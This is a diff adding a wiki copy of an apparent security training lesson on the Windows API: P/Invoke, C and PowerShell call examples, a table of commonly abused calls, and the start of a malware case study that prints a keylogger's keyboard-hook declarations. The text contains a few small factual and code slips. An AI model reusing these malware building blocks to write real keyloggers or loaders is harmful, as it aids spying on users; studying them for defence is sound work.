@@ -1,0 +1,417 @@
+<!--
+title: Windows API 
+description: 
+published: true
+date: 2022-10-27T18:46:28.577Z
+tags: 
+editor: ckeditor
+dateCreated: 2022-10-27T18:46:25.615Z
+-->
+
+<h1>Introduction</h1>
+<p>The Windows API provides native functionality to interact with key components of the Windows operating system. The API is widely used by many, including red teamers, threat actors, blue teamers, software developers, and solution providers.</p>
+<p>The API can integrate seamlessly with the Windows system, offering its range of use cases. You may see the Win32 API being used for offensive tool and malware development,&nbsp;<strong>EDR</strong> (<strong>E</strong>ndpoint&nbsp;<strong>D</strong>etection &amp;&nbsp;<strong>R</strong>esponse) engineering, and general software applications. For more information about all of the use cases for the API, check out the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows API Index</a>.</p>
+<h3>Learning Objectives</h3>
+<ol>
+  <li>Understand what the Windows API is, its use cases, and how it interacts with the OS subsystems</li>
+  <li>Learn how to implement the Windows API in different languages</li>
+  <li>Understand how the Windows API can be used from a malicious perspective and break down several practical case studies</li>
+</ol>
+<p>Before beginning this room, we recommend general familiarity with operating system architecture. Basic programming knowledge is also recommended but not required.</p>
+<p>This room aims to teach the Windows API at a fundamental level. We will briefly cover implementations of the Win32 API, but we will focus on why and where API calls are used.</p>
+<h1>Subsystem and Hardware Interaction</h1>
+<p>Programs often need to access or modify Windows subsystems or hardware but are restricted to maintain machine stability. To solve this problem, Microsoft released the Win32 API, a library to interface between user-mode applications and the kernel.</p>
+<p>Windows distinguishes hardware access by two distinct modes: <strong>user</strong> and <strong>kernel mode</strong>. These modes determine the hardware, kernel, and memory access an application or driver is permitted. API or system calls interface between each mode, sending information to the system to be processed in kernel mode.</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>User mode</strong></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Kernel mode</strong></td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">No direct hardware access<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Direct hardware access<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Access to "owned" memory locations<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Access to entire physical memory<br>&nbsp;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>For more information about memory management, check out&nbsp;<a href="https://tryhackme.com/room/windowsinternals">Windows Internals</a>.</p>
+<p>Below is a visual representation of how a user application can use API calls to modify kernel components.</p>
+<figure class="image image_resized" style="width:445px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3099761e193a0fa0eab05432b07e0537.png" alt="Diagram showing the user mode at the top and kernel mode at the bottom, divided by the switching point"></figure>
+<p>When looking at how languages interact with the Win32 API, this process can become further warped; the application will go through the language runtime before going through the API.</p>
+<p>For more information about the runtime, check out <a href="https://tryhackme.com/room/runtimedetectionevasion">Runtime Detection Evasion</a>.</p>
+<h1>Components of the Windows API</h1>
+<p>The Win32 API, more commonly known as the Windows API, has several dependent components that are used to define the structure and organization of the API.</p>
+<p>Let’s break the Win32 API up via a top-down approach. We’ll assume the API is the top layer and the parameters that make up a specific call are the bottom layer. In the table below, we will describe the top-down structure at a high level and dive into more detail later.</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Layer</strong></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Explanation</strong></td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">API<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">A top-level/general term or theory used to describe any call found in the win32 API structure.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Header files or imports<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Defines libraries to be imported at run-time, defined by header files or library imports. Uses pointers to obtain the function address.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Core DLLs<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">A group of four DLLs that define call structures. (KERNEL32, USER32, and ADVAPI32). These DLLs define kernel and user services that are not contained in a single subsystem.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Supplemental DLLs<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Other DLLs defined as part of the Windows API. Controls separate subsystems of the Windows OS. ~36 other defined DLLs. (NTDLL, COM, FVEAPI, etc.)<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Call Structures<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Defines the API call itself and parameters of the call.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">API Calls<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">The API call used within a program, with function addresses obtained from pointers.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">In/Out Parameters<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">The parameter values that are defined by the call structures.&nbsp;<br>&nbsp;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>Let’s expand these definitions; in the next task, we will discuss importing libraries, the core header file, and the call structure. In task 4, we will dive deeper into the calls, understanding where and how to digest call parameters and variants.</p>
+<h1>OS Libraries</h1>
+<p>Each API call of the Win32 library resides in memory and requires a pointer to a memory address. The process of obtaining pointers to these functions is obscured because of&nbsp;<strong>ASLR</strong> (<strong>A</strong>ddress&nbsp;<strong>S</strong>pace&nbsp;<strong>L</strong>ayout&nbsp;<strong>R</strong>andomization) implementations; each language or package has a unique procedure to overcome ASLR. Throughout this room, we will discuss the two most popular implementations:&nbsp;<a href="https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke"><strong>P/Invoke</strong></a> and the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/winprog/using-the-windows-headers"><strong>Windows header file</strong></a>.</p>
+<p>In this task, we will take a deep dive into the theory of how both of these implementations work, and in future tasks, we will put them to practical use.</p>
+<h3>Windows Header File</h3>
+<p>Microsoft has released the Windows header file, also known as the Windows loader, as a direct solution to the problems associated with ASLR’s implementation. Keeping the concept at a high level, at runtime, the loader will determine what calls are being made and create a thunk table to obtain function addresses or pointers.</p>
+<p>Luckily, we do not have to dive deeper than that to continue working with API calls if we do not desire to do so.</p>
+<p>Once the <code>windows.h</code> file is included at the top of an unmanaged program; any Win32 function can be called.</p>
+<p>We will cover this concept at a more practical level in task 6.</p>
+<h3>P/Invoke</h3>
+<p>Microsoft describes P/Invoke or platform invoke as “a technology that allows you to access structs, callbacks, and functions in unmanaged libraries from your managed code.”</p>
+<p>P/invoke provides tools to handle the entire process of invoking an unmanaged function from managed code or, in other words, calling the Win32 API. P/invoke will kick off by importing the desired DLL that contains the unmanaged function or Win32 API call. Below is an example of importing a DLL with options.</p>
+<pre><code class="language-plaintext">using System;
+using System.Runtime.InteropServices;
+
+public class Program
+{
+[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+...
+} </code></pre>
+<p>In the above code, we are importing the DLL <code>user32</code> using the attribute: <code>DLLImport</code>.</p>
+<p>Note: a semicolon is not included because the p/invoke function is not yet complete. In the second step, we must define a managed method as an external one. The <code>extern</code> keyword will inform the runtime of the specific DLL that was previously imported. Below is an example of creating the external method.</p>
+<pre><code class="language-plaintext">using System;
+using System.Runtime.InteropServices;
+
+public class Program
+{
+...
+private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);
+} </code></pre>
+<p>Now we can invoke the function as a managed method, but we are calling the unmanaged function!</p>
+<h1>API Call Structure</h1>
+<p>API calls are the second main component of the Win32 library. These calls offer extensibility and flexibility that can be used to meet a plethora of use cases. Most Win32 API calls are well documented under the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows API documentation</a> and&nbsp;<a href="http://pinvoke.net/">pinvoke.net</a>.</p>
+<p>In this task, we will take an introductory look at naming schemes and in/out parameters of API calls.</p>
+<p>API call functionality can be extended by modifying the naming scheme and appending a representational character. Below is a table of the characters Microsoft supports for its naming scheme.</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Character&nbsp;</strong></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Explanation</strong></td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">A</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Represents an 8-bit character set with ANSI encoding<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">W</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Represents a Unicode encoding<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Ex</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Provides extended functionality or in/out parameters to the API call<br>&nbsp;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>For more information about this concept, check out the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings">Microsoft documentation</a>.</p>
+<hr>
+<p>Each API call also has a pre-defined structure to define its in/out parameters. You can find most of these structures on the corresponding API call document page of the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows documentation</a>, along with explanations of each I/O parameter.</p>
+<p>Let’s take a look at the <code>WriteProcessMemory</code> API call as an example. Below is the I/O structure for the call obtained&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">here</a>.</p>
+<pre><code class="language-cpp">BOOL WriteProcessMemory(
+  [in]  HANDLE  hProcess,
+  [in]  LPVOID  lpBaseAddress,
+  [in]  LPCVOID lpBuffer,
+  [in]  SIZE_T  nSize,
+  [out] SIZE_T  *lpNumberOfBytesWritten
+);
+</code></pre>
+<p>For each I/O parameter, Microsoft also explains its use, expected input or output, and accepted values.</p>
+<p>Even with an explanation determining these values can sometimes be challenging for particular calls. We suggest always researching and finding examples of API call usage before using a call in your code.</p>
+<h1>C API Implementations</h1>
+<p>Microsoft provides low-level programming languages such as C and C++ with a pre-configured set of libraries that we can use to access needed API calls.</p>
+<p>The <code>windows.h</code> header file, as discussed in task 4, is used to define call structures and obtain function pointers. To include the windows header, prepend the line below to any C or C++ program.</p>
+<p><code>#include &lt;windows.h&gt;</code></p>
+<p>Let’s jump right into creating our first API call. As our first objective, we aim to create a pop-up window with the title: “Hello THM!” using <code>CreateWindowExA</code>. To reiterate what was covered in task 5, let’s observe the in/out parameters of the call.</p>
+<pre><code class="language-cpp">HWND CreateWindowExA(
+  [in]           DWORD     dwExStyle, // Optional windows styles
+  [in, optional] LPCSTR    lpClassName, // Windows class
+  [in, optional] LPCSTR    lpWindowName, // Windows text
+  [in]           DWORD     dwStyle, // Windows style
+  [in]           int       X, // X position
+  [in]           int       Y, // Y position
+  [in]           int       nWidth, // Width size
+  [in]           int       nHeight, // Height size
+  [in, optional] HWND      hWndParent, // Parent windows
+  [in, optional] HMENU     hMenu, // Menu
+  [in, optional] HINSTANCE hInstance, // Instance handle
+  [in, optional] LPVOID    lpParam // Additional application data
+);
+</code></pre>
+<p>Let’s take these pre-defined parameters and assign values to them. As mentioned in task 5, each parameter for an API call has an explanation of its purpose and potential values. Below is an example of a complete call to <code>CreateWindowsExA</code>.</p>
+<pre><code class="language-cpp">HWND hwnd = CreateWindowsEx(
+	0, 
+	CLASS_NAME, 
+	L"Hello THM!", 
+	WS_OVERLAPPEDWINDOW, 
+	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
+	NULL, 
+	NULL, 
+	hInstance, 
+	NULL
+	);
+</code></pre>
+<p>We’ve defined our first API call in C! Now we can implement it into an application and use the functionality of the API call. Below is an example application that uses the API to create a small blank window.</p>
+<pre><code class="language-cpp">BOOL Create(
+        PCWSTR lpWindowName,
+        DWORD dwStyle,
+        DWORD dwExStyle = 0,
+        int x = CW_USEDEFAULT,
+        int y = CW_USEDEFAULT,
+        int nWidth = CW_USEDEFAULT,
+        int nHeight = CW_USEDEFAULT,
+        HWND hWndParent = 0,
+        HMENU hMenu = 0
+        )
+    {
+        WNDCLASS wc = {0};
+
+        wc.lpfnWndProc   = DERIVED_TYPE::WindowProc;
+        wc.hInstance     = GetModuleHandle(NULL);
+        wc.lpszClassName = ClassName();
+
+        RegisterClass(&amp;wc);
+
+        m_hwnd = CreateWindowEx(
+            dwExStyle, ClassName(), lpWindowName, dwStyle, x, y,
+            nWidth, nHeight, hWndParent, hMenu, GetModuleHandle(NULL), this
+            );
+
+        return (m_hwnd ? TRUE : FALSE);
+    }
+</code></pre>
+<p>If successful, we should see a window with the title “Hello THM!”.</p>
+<p>As demonstrated throughout this task, low-level languages make it very easy to define an API call quickly. Because of the ease of use and extensibility, C-based languages are the most popular among threat actors and vendors alike.</p>
+<h1>.NET and PowerShell API Implementations</h1>
+<p>As discussed in task 4,&nbsp;<strong>P/Invoke</strong>&nbsp;allows us to import DLLs and assign pointers to API calls.</p>
+<p>To understand how P/Invoke is implemented, let’s jump right into it with an example below and discuss individual components afterward.</p>
+<pre><code class="language-cpp">class Win32 {
+	[DllImport("kernel32")]
+	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
+}
+</code></pre>
+<p>The class function stores defined API calls and a definition to reference in all future methods.</p>
+<p>The library in which the API call structure is stored must now be imported using <code>DllImport</code>. The imported DLLs act similar to the header packages but require that you import a specific DLL with the API call you are looking for. You can reference the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">API index</a> or&nbsp;<a href="http://pinvoke.net/">pinvoke.net</a> to determine where a particular API call is located in a DLL.</p>
+<p>From the DLL import, we can create a new pointer to the API call we want to use, notably defined by <code>intPtr</code>. Unlike other low-level languages, you must specify the in/out parameter structure in the pointer. As discussed in task 5, we can find the in/out parameters for the required API call from the Windows documentation.</p>
+<p>Now we can implement the defined API call into an application and use its functionality. Below is an example application that uses the API to get the computer name and other information of the device it is run on.</p>
+<pre><code class="language-plaintext">class Win32 {
+	[DllImport("kernel32")]
+	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
+}
+
+static void Main(string[] args) {
+	bool success;
+	StringBuilder name = new StringBuilder(260);
+	uint size = 260;
+	success = GetComputerNameA(name, ref size);
+	Console.WriteLine(name.ToString());
+}
+</code></pre>
+<p>If successful, the program should return the computer name of the current device.</p>
+<p>Now that we’ve covered how it can be accomplished in .NET let’s look at how we can adapt the same syntax to work in PowerShell.</p>
+<p>Defining the API call is almost identical to .NET’s implementation, but we will need to create a method instead of a class and add a few additional operators.</p>
+<pre><code class="language-plaintext">$MethodDefinition = @"
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+"@;
+</code></pre>
+<p>The calls are now defined, but PowerShell requires one further step before they can be initialized. We must create a new type for the pointer of each Win32 DLL within the method definition. The function <code>Add-Type</code> will drop a temporary file in the <code>/temp</code> directory and compile needed functions using <code>csc.exe</code>. Below is an example of the function being used.</p>
+<pre><code class="language-plaintext">$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+</code></pre>
+<p>We can now use the required API calls with the syntax below.</p>
+<p><code>[Win32.Kernel32]::&lt;Imported Call&gt;()</code></p>
+<h1>Commonly Abused API Calls</h1>
+<p>Several API calls within the Win32 library lend themselves to be easily leveraged for malicious activity.</p>
+<p>Several entities have attempted to document and organize all available API calls with malicious vectors, including&nbsp;<a href="https://www.sans.org/white-papers/33649/">SANs</a> and&nbsp;<a href="http://malapi.io/">MalAPI.io</a>.</p>
+<p>While many calls are abused, some are seen in the wild more than others. Below is a table of the most commonly abused API organized by frequency in a collection of samples.</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>API Call</strong></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Explanation</strong></td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">LoadLibraryA<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Maps a specified&nbsp;DLL &nbsp;into the address space of the calling process<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">GetUserNameA<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Retrieves the name of the user associated with the current thread<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">GetComputerNameA<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Retrieves a NetBIOS or&nbsp;DNS &nbsp;name of the local computer<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">GetVersionExA<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Obtains information about the version of the operating system currently running<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">GetModuleFileNameA<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Retrieves the fully qualified path for the file of the specified module and process<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">GetStartupInfoA<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Retrieves contents of STARTUPINFO structure (window station, desktop, standard handles, and appearance of a process)<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">GetModuleHandle<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Returns a module handle for the specified module if mapped into the calling process's address space<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">GetProcAddress<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Returns the address of a specified exported&nbsp;DLL &nbsp;function<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">VirtualProtect<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Changes the protection on a region of memory in the virtual address space of the calling process<br>&nbsp;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<h1>Malware Case Study</h1>
+<p>Now that we understand the underlying implementations of the Win32 library and commonly abused API calls, let’s break down two malware samples and observe how their calls interact.</p>
+<p>In this task, we will be breaking down a C# keylogger and shellcode launcher.</p>
+<h3>Keylogger</h3>
+<p>To begin analyzing the keylogger, we need to collect which API calls and hooks it is implementing. Because the keylogger is written in C#, it must use P/Invoke to obtain pointers for each call. Below is a snippet of the p/invoke definitions of the malware sample source code.</p>
+<pre><code class="language-plaintext">[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+private static extern IntPtr GetModuleHandle(string lpModuleName);
+private static int WHKEYBOARDLL = 13;
+[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+private static extern IntPtr GetCurrentProcess();</code></pre>
+<p>Below is an explanation of each API call and its respective use.</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>API Call</strong></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Explanation</strong></td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">SetWindowsHookEx<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Installs a memory hook into a hook chain to monitor for certain events<br>&nbsp;</td>
+      </tr>
+      <tr>
